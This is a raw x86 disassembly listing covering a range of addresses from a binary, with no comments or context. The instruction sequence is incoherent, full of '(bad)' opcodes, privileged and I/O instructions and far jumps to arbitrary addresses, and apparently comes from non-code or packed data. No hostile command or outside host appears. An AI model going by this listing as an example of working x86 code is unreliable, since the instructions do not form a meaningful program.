  412c5a:	xchg   esp,eax
  412c5b:	(bad)  
  412c5c:	mov    ch,0x49
  412c5e:	mov    eax,ds:0x96277941
  412c63:	(bad)  
  412c64:	sbb    esi,DWORD PTR [ecx+0x1d285137]
  412c6a:	dec    ebx
  412c6b:	cmova  edi,DWORD PTR [edx+0xd]
  412c6f:	dec    ebx
  412c70:	dec    edx
  412c71:	push   0xd472601
  412c76:	jl     0x412cd3
  412c78:	mov    ds:0x5f28146,al
  412c7d:	jp     0x412c95
  412c7f:	dec    edx
  412c80:	adc    eax,DWORD PTR [ebx+edi*2]
  412c83:	clc    
  412c84:	aad    0xce
  412c86:	cmp    eax,0x2700222d
  412c8b:	pop    es
  412c8c:	call   0x7322:0xbf6ef8bf
  412c93:	mov    ebp,DWORD PTR [esi]
  412c95:	cmp    edi,0x10
  412c98:	and    ecx,DWORD PTR [edx+0x7b00694b]
  412c9e:	idiv   ecx
  412ca0:	fild   QWORD PTR [esi]
  412ca2:	adc    ebx,DWORD PTR [ecx+0x5626e155]
  412ca8:	and    ah,dh
  412caa:	and    al,0xf7
  412cac:	mov    esi,esi
  412cae:	cmp    BYTE PTR [eax],bh
  412cb0:	ret    0x9f95
  412cb3:	jmp    0xde448200
  412cb8:	scas   al,BYTE PTR es:[edi]
  412cb9:	aad    0x48
  412cbb:	push   cs
  412cbc:	pop    ds
  412cbd:	aas    
  412cbe:	jmp    0x412cb3
  412cc0:	scas   eax,DWORD PTR es:[edi]
  412cc1:	xlat   BYTE PTR ds:[ebx]
  412cc2:	dec    ebx
  412cc3:	xor    eax,0x491a7443
  412cc8:	adc    al,0x7
  412cca:	dec    ebx
  412ccb:	or     al,0xb3
  412ccd:	inc    ebx
  412cce:	cs test eax,0xa53a82fa
  412cd4:	cdq    
  412cd5:	imul   ebx,DWORD PTR [edi],0x439a870
  412cdb:	imul   dh
  412cdd:	jb     0x412cfd
  412cdf:	cs fs lahf 
  412ce2:	and    BYTE PTR [ebx-0x14],bh
  412ce5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ce6:	xor    al,0xea
  412ce8:	mov    bh,0x51
  412cea:	jne    0x412cab
  412cec:	add    ch,cl
  412cee:	in     al,0xe6
  412cf0:	mov    dl,0xc5
  412cf2:	inc    esi
  412cf3:	or     eax,ecx
  412cf5:	repz jl 0x412cc0
  412cf8:	cmp    BYTE PTR [edi-0x60],0x6b
  412cfc:	xor    eax,0xb8aeea33
  412d01:	outs   dx,BYTE PTR ds:[esi]
  412d02:	hlt    
  412d03:	push   cs
  412d04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d05:	and    BYTE PTR [ecx+0x6243cc1d],al
  412d0b:	das    
  412d0c:	push   ss
  412d0d:	je     0x412d06
  412d0f:	sar    BYTE PTR [esi+eax*4],1
  412d12:	fdivr  DWORD PTR [edi+0x13307c70]
  412d18:	push   ecx
  412d19:	push   DWORD PTR [ebx+0x5d]
  412d1c:	jbe    0x412d13
  412d1e:	jne    0x412ccd
  412d20:	sub    ah,al
  412d22:	cld    
  412d23:	fimul  WORD PTR [ebx]
  412d25:	cmp    ecx,DWORD PTR [eax]
  412d27:	cld    
  412d28:	mov    dh,0x68
  412d2a:	inc    ecx
  412d2b:	sub    dl,dh
  412d2d:	inc    edx
  412d2e:	js     0x412d14
  412d30:	ins    DWORD PTR es:[edi],dx
  412d31:	test   al,0xfb
  412d33:	nop
  412d34:	inc    edi
  412d35:	push   ss
  412d36:	(bad)  
  412d37:	loope  0x412d8a
  412d39:	cmp    DWORD PTR [edi],0xc66b86b4
  412d3f:	(bad)  
  412d41:	xchg   ebp,eax
  412d42:	mov    cl,0xc9
  412d45:	ret    0xe1c6
  412d48:	into   
  412d49:	retf   
  412d4a:	xchg   edx,eax
  412d4b:	inc    ebx
  412d4c:	clc    
  412d4d:	hlt    
  412d4e:	fwait
  412d4f:	sbb    esp,ebx
  412d51:	mov    BYTE PTR [edx-0x7cbd188d],0x34
  412d58:	ja     0x412cdc
  412d5a:	or     BYTE PTR [ecx-0x537a02cb],al
  412d60:	pop    esi
  412d61:	and    ebx,DWORD PTR [ebp+0x22319d21]
  412d67:	pop    DWORD PTR [ecx+ecx*4]
  412d6a:	inc    edx
  412d6b:	jbe    0x412da9
  412d6d:	in     eax,0x56
  412d6f:	xor    bl,BYTE PTR [ecx]
  412d71:	scas   al,BYTE PTR es:[edi]
  412d72:	adc    DWORD PTR [edi],0x95fbaedf
  412d78:	mov    ch,0x1a
  412d7a:	call   0xe991:0xaefb0806
  412d81:	fcomp  QWORD PTR [edx+0x3f7e6fdf]
  412d87:	add    eax,0x65a660ff
  412d8c:	xchg   edx,eax
  412d8d:	shl    al,1
  412d8f:	jae    0x412df2
  412d91:	jmp    0xe3922a45
  412d96:	popa   
  412d97:	add    edx,esi
  412d99:	stc    
  412d9a:	icebp  
  412d9b:	and    ecx,edx
  412d9d:	mov    ebx,0x72ddaa59
  412da2:	cmp    al,0xc2
  412da4:	mov    ds,ebp
  412da6:	lods   eax,DWORD PTR ds:[esi]
  412da7:	sbb    ebp,DWORD PTR [esp+edi*1-0x63a23db2]
  412dae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412daf:	mov    edi,0x67c1e21b
  412db4:	loopne 0x412e13
  412db6:	mov    ebp,0x13589e97
  412dbb:	or     al,0x2f
  412dbd:	push   edx
  412dbe:	nop
  412dbf:	sbb    eax,0x2da2dadb
  412dc4:	mov    al,0x15
  412dc6:	arpl   WORD PTR [ecx+0x41],si
  412dc9:	cmp    ah,BYTE PTR [ebx]
  412dcb:	aad    0xa6
  412dcd:	add    DWORD PTR [esi-0x108b2ac7],0x1bedf4f3
  412dd7:	ror    DWORD PTR [edi+0x50],0xd4
  412ddb:	(bad)  
  412ddc:	lods   al,BYTE PTR ds:[esi]
  412ddd:	mov    WORD PTR [eax],ss
  412ddf:	dec    esi
  412de0:	fcomp  st(1)
  412de2:	int3   
  412de3:	or     eax,0x15a16bce
  412de8:	mov    es,WORD PTR [ecx]
  412dea:	mov    ch,0xfe
  412dec:	dec    ecx
  412ded:	ficomp DWORD PTR [ebx+eiz*1-0x6]
  412df1:	addr16 mov edx,0xd64cd950
  412df7:	stc    
  412df8:	adc    DWORD PTR [eax+0x264b002e],ecx
  412dfe:	sbb    bl,BYTE PTR [eax-0x7511d07d]
  412e04:	add    esp,esi
  412e06:	mov    ebx,0xf2b9eed4
  412e0b:	cld    
  412e0c:	out    dx,al
  412e0d:	lods   al,BYTE PTR ds:[esi]
  412e0e:	(bad)  
  412e10:	ds jbe 0x412dc2
  412e13:	cs (bad) 
  412e15:	ja     0x412ddb
  412e17:	sti    
  412e18:	jp     0x412e35
  412e1a:	pop    eax
  412e1b:	cmc    
  412e1c:	jp     0x412e1f
  412e1e:	xchg   edi,eax
  412e1f:	sar    BYTE PTR [ebx],1
  412e21:	and    DWORD PTR [ebp+0x1609f591],esi
  412e27:	inc    esi
  412e28:	call   0x34a3:0x44b8d99
  412e2f:	adc    eax,0x104dc7b8
  412e34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e35:	into   
  412e36:	cmp    BYTE PTR [ebx+0x66bb4fb4],0x73
  412e3d:	test   DWORD PTR ds:0x46fd719b,0x5a50b95f
  412e47:	mov    ch,0xf6
  412e49:	ins    DWORD PTR es:[edi],dx
  412e4a:	xchg   ecx,eax
  412e4b:	and    ah,dl
  412e4d:	and    eax,0x367316ff
  412e52:	nop
  412e53:	test   DWORD PTR [edi+0x77],0xa97629f6
  412e5a:	ins    BYTE PTR es:[edi],dx
  412e5b:	xlat   BYTE PTR ds:[ebx]
  412e5c:	xchg   edx,eax
  412e5d:	mov    esi,0xbcf51da1
  412e62:	loope  0x412e56
  412e64:	push   cs
  412e65:	xor    DWORD PTR [eax+edx*2+0x7b296ae5],0xf1833b01
  412e70:	pop    eax
  412e71:	jnp    0x412e48
  412e73:	loop   0x412e03
  412e75:	stos   BYTE PTR es:[edi],al
  412e76:	add    BYTE PTR [ecx],bl
  412e78:	dec    edx
  412e79:	pop    ds
  412e7a:	das    
  412e7b:	fcomp  QWORD PTR [ecx]
  412e7d:	lock inc esp
  412e7f:	enter  0xe810,0x36
  412e83:	push   edx
  412e84:	pop    edx
  412e85:	sub    DWORD PTR [eax+0x59c38ac1],eax
  412e8b:	outs   dx,DWORD PTR ds:[esi]
  412e8c:	add    bl,BYTE PTR [edi]
  412e8e:	daa    
  412e8f:	fs add al,0x64
  412e92:	nop
  412e93:	addr16 (bad) 
  412e95:	jns    0x412efa
  412e97:	adc    eax,0x9d90a901
  412e9c:	lods   al,BYTE PTR ds:[esi]
  412e9d:	jbe    0x412f08
  412e9f:	adc    edi,DWORD PTR [ebx-0x497ed514]
  412ea5:	xor    BYTE PTR [ecx+eax*4],ah
  412ea8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ea9:	pop    ebx
  412eaa:	add    ebp,edx
  412eac:	add    al,0x73
  412eae:	or     eax,0x5424db88
  412eb3:	inc    ecx
  412eb4:	sub    bh,BYTE PTR [ebx-0x58]
  412eb7:	push   DWORD PTR [esi]
  412eb9:	repz cmp eax,0x44478e05
  412ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ec0:	or     ebp,DWORD PTR [edi-0x38]
  412ec3:	stos   DWORD PTR es:[edi],eax
  412ec4:	mov    ch,0xe1
  412ec6:	(bad)  
  412ec7:	(bad)  
  412ec9:	inc    ecx
  412eca:	add    al,0x2d
  412ecc:	inc    edx
  412ecd:	daa    
  412ece:	and    DWORD PTR [eax],0x33657cde
  412ed4:	aas    
  412ed5:	jmp    0x617d:0x2eed8422
  412edc:	pusha  
  412edd:	into   
  412ede:	pop    ss
  412edf:	mov    esi,ecx
  412ee1:	out    0xc5,al
  412ee3:	xor    ebp,ebx
  412ee5:	jge    0x412f0b
  412ee7:	adc    eax,0x5eae9061
  412eec:	inc    ebp
  412eed:	mov    eax,DWORD PTR ds:[ebx]
  412ef0:	pop    ebp
  412ef1:	outs   dx,DWORD PTR ds:[esi]
  412ef2:	push   ebp
  412ef3:	adc    DWORD PTR [edi-0x72],edi
  412ef6:	lds    edi,FWORD PTR gs:[eax-0x2aab8087]
  412efd:	or     BYTE PTR [ebx+0x1e84b9ab],bl
  412f03:	pop    ecx
  412f04:	mov    ebp,0xe7a8b6a5
  412f09:	push   esi
  412f0a:	xchg   ebx,eax
  412f0b:	mov    al,ds:0xdffdb72f
  412f10:	fs mov cl,bl
  412f13:	popf   
  412f14:	stos   DWORD PTR es:[edi],eax
  412f15:	sub    DWORD PTR ds:[edi+0x7e],ebp
  412f19:	outs   dx,BYTE PTR ds:[esi]
  412f1a:	ror    DWORD PTR [edx+0x7],1
  412f1d:	xor    eax,0x6b58ce5e
  412f22:	mov    DWORD PTR [eax+0x1e],ebx
  412f25:	push   ebp
  412f26:	inc    eax
  412f27:	push   esp
  412f28:	out    dx,eax
  412f29:	or     esp,esi
  412f2b:	xchg   ecx,eax
  412f2c:	pusha  
  412f2d:	lock in al,0x46
  412f30:	add    al,0xf8
  412f32:	inc    edi
  412f33:	hlt    
  412f34:	or     ch,BYTE PTR [edx-0x7c266d72]
  412f3a:	ret    
  412f3b:	dec    ebp
  412f3c:	shl    DWORD PTR [edi],0x7
  412f3f:	xchg   esp,eax
  412f40:	sbb    eax,0x3bec06db
  412f45:	mov    edx,0xa4e56a6f
  412f4a:	jp     0x412f71
  412f4c:	adc    al,0xbf
  412f4e:	inc    ecx
  412f4f:	xor    al,0x5b
  412f51:	xchg   ebx,eax
  412f52:	sti    
  412f53:	mov    DWORD PTR [eax],edx
  412f55:	arpl   WORD PTR [ecx-0x41],si
  412f58:	inc    esi
  412f59:	sub    eax,0x7759598b
  412f5e:	mov    ds:0x296faad2,eax
  412f63:	lds    ebx,FWORD PTR [eax]
  412f65:	dec    esp
  412f66:	retf   
  412f67:	jne    0x412f66
  412f69:	cmp    BYTE PTR [esi],al
  412f6b:	xor    BYTE PTR [ecx+0x62],0x79
  412f6f:	aaa    
  412f70:	mov    fs,WORD PTR ds:0xf64d8aa3
  412f76:	dec    ecx
  412f77:	add    eax,eax
  412f79:	sahf   
  412f7a:	inc    esp
  412f7b:	pop    ecx
  412f7c:	inc    ebp
  412f7d:	inc    ebx
  412f7e:	or     al,0xb3
  412f80:	lahf   
  412f81:	sub    DWORD PTR [ecx+0x72],esp
  412f84:	push   es
  412f85:	push   es
  412f86:	fdiv   DWORD PTR [eax]
  412f88:	in     al,0x56
  412f8a:	cmp    edi,DWORD PTR [ebx+0x74]
  412f8d:	sahf   
  412f8e:	dec    esp
  412f8f:	out    dx,eax
  412f90:	dec    ebp
  412f91:	les    esi,FWORD PTR [ebp-0x18cffd38]
  412f97:	or     al,BYTE PTR [ebx+0x43]
  412f9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f9b:	xor    DWORD PTR [ebp-0x39],0x8c25228
  412fa2:	jo     0x41300e
  412fa4:	(bad)  
  412fa5:	sub    ax,0x99fa
  412fa9:	mov    al,0xce
  412fab:	cmp    esi,DWORD PTR [edi+edi*2]
  412fae:	jmp    0x16e43832
  412fb3:	lods   al,BYTE PTR ds:[esi]
  412fb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fb5:	push   es
  412fb6:	sti    
  412fb7:	pop    esi
  412fb8:	cli    
  412fb9:	ret    0x60e
  412fbc:	(bad)  
  412fbd:	in     eax,dx
  412fbe:	aad    0x3f
  412fc0:	mov    al,ds:0xdee67ad3
  412fc5:	aas    
  412fc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fc7:	aaa    
  412fc8:	mov    es,ebp
  412fca:	clc    
  412fcb:	loopne 0x412f62
  412fcd:	sbb    ch,cl
  412fcf:	outs   dx,BYTE PTR ds:[esi]
  412fd0:	pop    ecx
  412fd1:	outs   dx,BYTE PTR ds:[esi]
  412fd2:	ror    BYTE PTR [edx+eax*2-0x80],0xc8
  412fd7:	xchg   edi,eax
  412fd8:	rcr    DWORD PTR [ecx],cl
  412fda:	test   al,0x91
  412fdc:	jle    0x412ffe
  412fde:	(bad)
  412fe1:	xchg   edi,eax
  412fe2:	call   0xac16c68d
  412fe7:	lock xchg ebp,eax
  412fe9:	nop
  412fea:	popf   
  412feb:	aas    
  412fec:	sbb    edi,DWORD PTR [ebp-0x15d2f8f1]
  412ff2:	lods   eax,DWORD PTR ds:[esi]
  412ff3:	xchg   ebp,eax
  412ff4:	jle    0x412fb7
  412ff6:	xlat   BYTE PTR ds:[ebx]
  412ff7:	mov    dh,0x4d
  412ff9:	sub    BYTE PTR [ebp-0x8],dh
  412ffc:	(bad)  
  412ffd:	sysenter 
  412fff:	out    dx,eax
  413000:	mov    bl,0x3d
  413002:	add    dl,0x2b
  413005:	jbe    0x412ff7
  413007:	xor    eax,0x90ba1ae9
  41300c:	aaa    
  41300d:	into   
  41300e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41300f:	mov    ch,0x4c
  413011:	clc    
  413012:	test   DWORD PTR [esi+edi*4+0x6bee0084],0x82ad62a1
  41301d:	addr16 jnp 0x41300a
  413020:	fsubr  DWORD PTR [edi-0x3ace2f19]
  413026:	adc    DWORD PTR [ecx-0x66],ebp
  413029:	(bad)  
  41302a:	pop    es
  41302b:	addr16 xchg edi,eax
  41302d:	leave  
  41302e:	mov    eax,DWORD PTR [ecx-0x16]
  413031:	push   es
  413032:	lods   al,BYTE PTR ds:[esi]
  413033:	imul   edi,DWORD PTR [edx-0x6c],0xbb39ef63
  41303a:	repz scas eax,DWORD PTR es:[edi]
  41303c:	sahf   
  41303d:	xchg   ebp,eax
  41303e:	lods   al,BYTE PTR ds:[esi]
  41303f:	aam    0xd5
  413041:	or     DWORD PTR [eax+0x23],ebp
  413044:	fmul   QWORD PTR [ebp-0x22]
  413047:	mov    esi,0x367f2caa
  41304c:	cmp    ah,BYTE PTR [ebx-0x4e29c241]
  413052:	adc    ebx,DWORD PTR [esi+ebx*1]
  413055:	ins    BYTE PTR es:[edi],dx
  413056:	or     BYTE PTR [ebx-0x51c446f1],al
  41305c:	leave  
  41305d:	gs pop ecx
  41305f:	sbb    edx,ebp
  413061:	popa   
  413062:	ins    BYTE PTR es:[edi],dx
  413063:	sub    BYTE PTR [ecx+ecx*4-0x3f],0xd6
  413068:	or     bh,BYTE PTR [esi]
  41306a:	xor    eax,0xf1059b91
  41306f:	test   al,0x26
  413071:	cli    
  413072:	xchg   ecx,eax
  413073:	into   
  413074:	dec    BYTE PTR [eax+0x2a]
  413077:	fcomp  st(3)
  413079:	pop    es
  41307a:	mov    ecx,0x6281dfa3
  41307f:	int3   
  413080:	or     dl,ah
  413082:	or     ch,dh
  413084:	sub    DWORD PTR [esp+esi*8-0x6b3ca3fa],ecx
  41308b:	repz jp 0x41307e
  41308e:	cmp    al,0xfb
  413090:	sbb    al,ah
  413092:	ficom  WORD PTR [ebp-0x60]
  413095:	sbb    al,0xa0
  413097:	cwde   
  413098:	inc    ebp
  413099:	ins    DWORD PTR es:[edi],dx
  41309a:	push   ds
  41309b:	xor    al,0xc2
  41309d:	mov    esi,DWORD PTR [esi-0x2fed2a85]
  4130a3:	jmp    0xc2b8:0xf9cc6678
  4130aa:	popf   
  4130ab:	mov    eax,0x22880225
  4130b0:	xchg   edi,eax
  4130b1:	fbstp  TBYTE PTR [esi-0x67780f46]
  4130b7:	popf   
  4130b8:	test   ah,bl
  4130ba:	xchg   dh,ch
  4130bc:	loop   0x41308f
  4130be:	call   0x1bda:0x28bb1284
  4130c5:	dec    edi
  4130c6:	add    edi,DWORD PTR [ecx+ebx*1]
  4130c9:	push   eax
  4130ca:	pop    esi
  4130cb:	adc    DWORD PTR [di],eax
  4130ce:	mov    esi,0x9cbc641c
  4130d3:	test   eax,0x18f47c37
  4130d8:	pusha  
  4130d9:	pusha  
  4130da:	jne    0x4130cf
  4130dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130dd:	pop    esi
  4130de:	cmp    al,0x33
  4130e0:	into   
  4130e1:	stos   DWORD PTR es:[edi],eax
  4130e2:	jl     0x41310f
  4130e4:	xor    al,0x36
  4130e6:	ror    dl,cl
  4130e8:	push   ds
  4130e9:	pop    ss
  4130ea:	sar    DWORD PTR [ecx],1
  4130ec:	shr    BYTE PTR [ebp+edx*8-0x6e],1
  4130f0:	aam    0xe0
  4130f2:	xchg   ebp,eax
  4130f3:	das    
  4130f4:	les    ecx,FWORD PTR [edx]
  4130f6:	push   ecx
  4130f7:	mov    ebx,0x95c53a71
  4130fc:	mov    esi,0x82752182
  413101:	add    bh,BYTE PTR [eax]
  413103:	pop    esi
  413104:	xor    DWORD PTR [edx+0x6da33676],edi
  41310a:	mov    dh,BYTE PTR [ebp+0x59]
  41310d:	pop    ecx
  41310e:	push   edx
  41310f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413110:	jno    0x41318f
  413112:	bound  eax,QWORD PTR [esi+ebx*8+0x55]
  413116:	test   eax,0x867608c7
  41311b:	pop    ecx
  41311c:	or     esp,DWORD PTR [ebx]
  41311e:	jo     0x4130dc
  413120:	(bad)  
  413121:	shl    BYTE PTR [eax+0x6f],0x9d
  413125:	mov    bl,0x40
  413127:	rcr    BYTE PTR [ebp+0x37],cl
  41312a:	aam    0xd4
  41312c:	push   cs
  41312d:	or     ch,BYTE PTR [edx+0x50]
  413130:	xchg   edx,eax
  413131:	cld    
  413132:	cli    
  413133:	xor    bl,cl
  413135:	lds    eax,FWORD PTR [ebp-0x4b]
  413138:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413139:	pop    eax
  41313a:	jge    0x413128
  41313c:	js     0x413152
  41313e:	sub    ecx,ecx
  413140:	arpl   ax,di
  413142:	and    dh,BYTE PTR [esi+0x71]
  413145:	jg     0x413181
  413147:	pop    ecx
  413148:	sahf   
  413149:	xchg   esp,edx
  41314b:	int3   
  41314c:	lods   eax,DWORD PTR ds:[esi]
  41314d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41314e:	out    dx,eax
  41314f:	mov    ebx,DWORD PTR [edi+0x44782e0c]
  413155:	jg     0x413185
  413157:	pop    edi
  413158:	icebp  
  413159:	mov    eax,0x25d626b2
  41315e:	aam    0xd
  413160:	inc    eax
  413161:	fcom   QWORD PTR [ebx]
  413163:	mov    eax,DWORD PTR [eax-0x8b45b87]
  413169:	adc    BYTE PTR [edi+ebp*1-0x5980db93],0xb7
  413171:	stos   DWORD PTR es:[edi],eax
  413172:	lock mov eax,0xef90590c
  413178:	sub    dh,BYTE PTR ss:[edi-0x1]
  41317c:	scas   eax,DWORD PTR es:[edi]
  41317d:	jbe    0x4131ef
  41317f:	push   ebp
  413180:	(bad)
  413185:	out    dx,al
  413186:	out    0x1a,eax
  413188:	sar    ah,cl
  41318a:	xchg   DWORD PTR [ecx+0x1562b862],esp
  413190:	ins    BYTE PTR es:[edi],dx
  413191:	add    ebp,ebp
  413193:	xchg   ecx,eax
  413194:	jne    0x413133
  413196:	xor    eax,DWORD PTR [edi-0x48]
  413199:	cmp    al,0xf0
  41319b:	sbb    eax,0x2341e1b0
  4131a0:	jno    0x413138
  4131a2:	push   ebx
  4131a3:	das    
  4131a4:	test   eax,0xaa1d85df
  4131a9:	xchg   esi,eax
  4131aa:	mov    bl,0x54
  4131ac:	or     al,0x8e
  4131ae:	mov    esp,0xff1dc52b
  4131b3:	sbb    eax,0x81e5d2a0
  4131b8:	neg    DWORD PTR [edi+0x54]
  4131bb:	cmovge ecx,DWORD PTR [edi+0x29f1c94d]
  4131c2:	aas    
  4131c3:	sbb    eax,esp
  4131c5:	aam    0xb3
  4131c7:	push   edi
  4131c8:	sub    ebp,DWORD PTR ds:0x84723329
  4131ce:	xchg   ebp,eax
  4131cf:	dec    ebx
  4131d0:	add    bl,0xd9
  4131d3:	xchg   ecx,eax
  4131d4:	inc    eax
  4131d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131d6:	xlat   BYTE PTR ds:[ebx]
  4131d7:	clc    
  4131d8:	mul    DWORD PTR [eax+0x61f46481]
  4131de:	cmc    
  4131df:	into   
  4131e0:	in     al,0x95
  4131e2:	(bad)  
  4131e3:	test   eax,0xe345d7d5
  4131e8:	and    al,0x35
  4131ea:	jae    0x413173
  4131ec:	adc    ecx,DWORD PTR [ebx-0x3f]
  4131ef:	sub    al,0xb5
  4131f1:	cmp    eax,0x19aa442d
  4131f6:	add    al,0x63
  4131f8:	xchg   DWORD PTR [ebp+0x2a],eax
  4131fb:	and    eax,0xfccb2a18
  413200:	(bad)  
  413201:	frstor [ecx-0x459b4064]
  413207:	push   esi
  413208:	aas    
  413209:	lahf   
  41320a:	or     eax,0x4ff7d800
  41320f:	cdq    
  413210:	sbb    bl,al
  413212:	and    al,0x84
  413214:	cmp    al,0x19
  413216:	sbb    eax,0x969ce451
  41321b:	ds pushf 
  41321d:	jle    0x4131cf
  41321f:	push   esi
  413220:	leave  
  413221:	stos   DWORD PTR es:[edi],eax
  413222:	loopne 0x413201
  413224:	fcom   st(6)
  413226:	imul   ebx,edi,0xedc01b57
  41322c:	bound  ebp,QWORD PTR ds:0x68aa29d0
  413232:	jle    0x413292
  413234:	dec    esi
  413235:	xor    cl,BYTE PTR [eax*8-0x780fcb04]
  41323c:	lods   eax,DWORD PTR ds:[esi]
  41323d:	sti    
  41323e:	jg     0x413213
  413240:	xor    BYTE PTR [edx],ah
  413242:	pop    esp
  413243:	push   cs
  413244:	fist   DWORD PTR [edx-0xa]
  413247:	test   eax,0x632b4423
  41324c:	adc    eax,0x2a1c7b08
  413251:	and    ah,BYTE PTR [ebx-0x2d]
  413254:	dec    ebx
  413255:	ss jae 0x413270
  413258:	pop    ebx
  413259:	cmc    
  41325a:	mov    al,ds:0x9e189c4d
  41325f:	cmc    
  413260:	out    dx,al
  413261:	int    0x61
  413263:	jmp    0xf46:0x59f1282d
  41326a:	mov    bl,0x49
  41326c:	and    DWORD PTR [edi-0x44],edi
  41326f:	iret   
  413270:	inc    eax
  413271:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413272:	iret   
  413273:	push   ebx
  413274:	lods   al,BYTE PTR ds:[esi]
  413275:	push   ebx
  413276:	mov    ecx,0x977d690e
  41327b:	inc    esi
  41327c:	aas    
  41327d:	jp     0x413219
  41327f:	jae    0x413259
  413281:	lods   al,BYTE PTR ds:[esi]
  413282:	add    bl,ch
  413284:	or     eax,0x3a0b495b
  413289:	test   al,0xd4
  41328b:	inc    edx
  41328c:	push   ecx
  41328d:	ins    DWORD PTR es:[edi],dx
  41328e:	pop    ds
  41328f:	inc    edx
  413290:	inc    ecx
  413291:	and    eax,0x9b4061c0
  413296:	jbe    0x4132f7
  413298:	dec    ebx
  413299:	mov    dh,0x9
  41329b:	cmp    BYTE PTR [eax],bl
  41329d:	mov    ecx,0x94d9f12e
  4132a2:	or     al,BYTE PTR [eax]
  4132a4:	push   esp
  4132a5:	outs   dx,DWORD PTR ds:[esi]
  4132a6:	dec    eax
  4132a7:	dec    BYTE PTR [edx+ebp*2-0x16e6d65a]
  4132ae:	mov    edi,0xf80425b1
  4132b3:	jmp    0xd8aaa799
  4132b8:	mov    ch,BYTE PTR [ebx]
  4132ba:	dec    ebx
  4132bb:	dec    DWORD PTR [ebx]
  4132bd:	or     esi,DWORD PTR [ebx]
  4132bf:	sbb    eax,0x36e1d636
  4132c4:	fisttp DWORD PTR [eax-0x35]
  4132c7:	cwde   
  4132c8:	pop    edi
  4132c9:	mov    fs,esi
  4132cb:	ja     0x413336
  4132cd:	sbb    al,0x66
  4132cf:	mov    ds:0xa14bc9cd,al
  4132d4:	push   esi
  4132d5:	aam    0x37
  4132d7:	sbb    al,0x66
  4132d9:	inc    edi
  4132da:	push   ds
  4132db:	or     al,0xd3
  4132dd:	popf   
  4132de:	or     ah,BYTE PTR [ecx]
  4132e0:	jbe    0x413286
  4132e2:	outs   dx,DWORD PTR ds:[esi]
  4132e3:	(bad)  
  4132e4:	mov    al,bl
  4132e6:	sub    BYTE PTR [eax],al
  4132e8:	pop    esp
  4132e9:	add    BYTE PTR [ebx+0xdf87bec],dl
  4132ef:	jl     0x4132d7
  4132f1:	sti    
  4132f2:	add    dh,dh
  4132f4:	sub    DWORD PTR [esi],ebx
  4132f6:	or     cl,bh
  4132f8:	mov    es,WORD PTR [eax-0xb874364]
  4132fe:	sbb    eax,0xf70095e1
  413303:	jns    0x4132fd
  413305:	iret   
  413306:	(bad)  [edi+0x657457e4]
  41330c:	sub    BYTE PTR [ecx+esi*2],ch
  41330f:	gs jb  0x4132fd
  413312:	int    0xa3
  413314:	(bad)  
  413315:	enter  0x735,0x1f
  413319:	push   ds
  41331a:	xor    BYTE PTR [ebx-0x2e],bh
  41331d:	jmp    0xc92d:0xccc2478b
  413324:	or     al,BYTE PTR [edi+0x6]
  413327:	lock pop ebp
  413329:	or     BYTE PTR [edx-0x5f],dh
  41332c:	adc    ebx,esp
  41332e:	int3   
  41332f:	add    eax,0x3582af2
  413334:	sahf   
  413335:	scas   al,BYTE PTR es:[edi]
  413336:	add    BYTE PTR [ebx],dh
  413338:	fist   DWORD PTR [edx+0x1135e0f7]
  41333e:	pop    esi
  41333f:	add    al,0x44
  413341:	int3   
  413342:	loope  0x4133aa
  413344:	add    ah,al
  413346:	push   si
  413348:	dec    esi
  413349:	xchg   esp,eax
  41334a:	jne    0x413327
  41334c:	mov    es,WORD PTR ds:0x675145e9
  413352:	int    0x18
  413354:	jo     0x413366
  413356:	inc    eax
  413357:	cld    
  413358:	mov    ds:0x224fec49,eax
  41335d:	mov    ch,0x1c
  41335f:	mov    cs,WORD PTR fs:[ecx+0x4397b089]
  413366:	sbb    al,0xfe
  413368:	push   ebx
  413369:	ds arpl dx,ax
  41336c:	nop
  41336d:	push   edx
  41336e:	push   0x7
  413370:	jg     0x413399
  413372:	(bad)  
  413373:	lahf   
  413374:	fwait
  413375:	retf   0x9ab8
  413378:	mov    fs,WORD PTR [ebx]
  41337a:	rcl    DWORD PTR ds:0xb835c1ff,1
  413380:	jo     0x41330d
  413382:	xchg   ebx,eax
  413383:	sti    
  413384:	mov    BYTE PTR [eax+0x37],al
  413387:	repz xchg edx,eax
  413389:	cs xchg ebx,eax
  41338b:	gs dec ebx
  41338d:	cmp    DWORD PTR [edi-0x5a],esi
  413390:	das    
  413391:	in     eax,dx
  413392:	mov    BYTE PTR [bp+si],al
  413395:	cmp    BYTE PTR [eax+0x60],bh
  413398:	test   esi,eax
  41339a:	push   edi
  41339b:	or     al,0x9f
  41339d:	out    dx,eax
  41339e:	retf   0x323c
  4133a1:	data16 mov cl,0xc
  4133a4:	push   0xffffffd2
  4133a6:	in     al,0x73
  4133a8:	jle    0x4133ea
  4133aa:	pop    esi
  4133ab:	lods   al,BYTE PTR ds:[esi]
  4133ac:	out    dx,eax
  4133ad:	or     dh,0xa8
  4133b0:	or     BYTE PTR [esi+0x127f5b3],dh
  4133b6:	jle    0x413405
  4133b8:	and    al,0xc7
  4133ba:	daa    
  4133bb:	adc    DWORD PTR [esi+0x684d208f],edi
  4133c1:	jb     0x41341d
  4133c3:	cdq    
  4133c4:	sbb    esi,ebx
  4133c6:	das    
  4133c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133c8:	jne    0x4133e9
  4133ca:	cmp    ecx,0xffffffbf
  4133cd:	sub    esi,eax
  4133cf:	out    0xcd,eax
  4133d1:	mov    eax,0x96d6051f
  4133d6:	aad    0x2f
  4133d8:	imul   edi,edx,0x4c703e95
  4133de:	xchg   edi,eax
  4133df:	jecxz  0x4133cc
